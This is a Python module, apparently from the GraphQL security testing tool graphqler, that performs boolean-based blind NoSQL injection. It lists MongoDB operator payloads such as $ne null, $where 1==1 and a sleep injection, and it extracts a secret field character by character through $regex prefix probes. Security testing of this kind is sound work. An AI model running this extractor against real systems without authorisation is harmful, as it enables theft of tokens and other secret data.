from graphqler.utils import plugins_handler
from graphqler import config


# Operator strings that the NoSQL injection materializer may have placed in the payload.
# The extractor replaces whichever one is present with a $regex variant.
_OPERATOR_PATTERNS = [
    '"{$gt: \\"\\"}"',
    '"{$ne: null}"',
    '"{$regex: \\".*\\"}"',
    '"{$where: \\"1==1\\"}"',
    '"{$exists: true}"',
    '"{$nin: []}"',
    "\"' || '1'=='1\"",
    "\"; sleep(5000); var dummy=\"",
]


def _make_regex_payload(payload: str, prefix: str) -> str:
    """Substitute the first recognised operator string in *payload* with a
    ``$regex`` anchor payload that tests whether the target field starts with
    *prefix*.

    The prefix is inserted verbatim (no regex-escaping) because we want MongoDB
    to treat it as a literal prefix, and typical field values (IDs, tokens) do
    not contain regex special characters.
    """
    replacement = '"{\\"$regex\\": \\"^' + prefix + '\\"}"'
    for marker in _OPERATOR_PATTERNS:
        if marker in payload:
            return payload.replace(marker, replacement, 1)
    return payload


def _has_data(graphql_response: dict | None) -> bool:
    """Return True when the server returned non-empty ``data``."""
    if graphql_response is None:
        return False
    data = graphql_response.get("data")
    if not data:
        return False
    # data is a dict keyed by field name; check at least one value is non-null/non-empty
    for v in data.values():
        if v is None:
            continue
        if isinstance(v, (list, dict)) and not v:
            continue
        return True
    return False


class BlindNoSQLExtractor:
    """Attempt to extract a secret field value char-by-char using boolean-based
    blind NoSQL injection.

    The technique mirrors GraphQLmap's ``blind_nosql`` command:
    - Build a growing prefix ``extracted``
    - For each candidate character ``c`` substitute the operator payload in the
      original query with ``{"$regex": "^extracted_c"}``
    - Use *response data presence* as the boolean oracle (no manual check string
      required): data returned → prefix matched; data absent → no match
    - Stop when a full charset pass produces no new character, or the length cap
      ``NOSQLI_MAX_EXTRACTION_LENGTH`` is reached

    Only runs when ``config.NOSQLI_BLIND_EXTRACTION`` is ``True``.
    """

    def __init__(self, url: str, payload: str):
        self.url = url
        self.payload = payload
        self.charset = config.NOSQLI_EXTRACTION_CHARSET
        self.max_length = config.NOSQLI_MAX_EXTRACTION_LENGTH

    def extract(self) -> str:
        """Run the extraction loop and return whatever was extracted (may be empty)."""
        if not config.NOSQLI_BLIND_EXTRACTION:
            return ""

        extracted = ""
        while len(extracted) < self.max_length:
            found_char = False
            for c in self.charset:
                candidate = extracted + c
                probed = _make_regex_payload(self.payload, candidate)
                if probed == self.payload:
                    # No operator marker found in payload — cannot extract
                    return extracted
                graphql_response, _ = plugins_handler.get_request_utils().send_graphql_request(self.url, probed)
                if _has_data(graphql_response):
                    extracted = candidate
                    found_char = True
                    break
            if not found_char:
                break

        return extracted
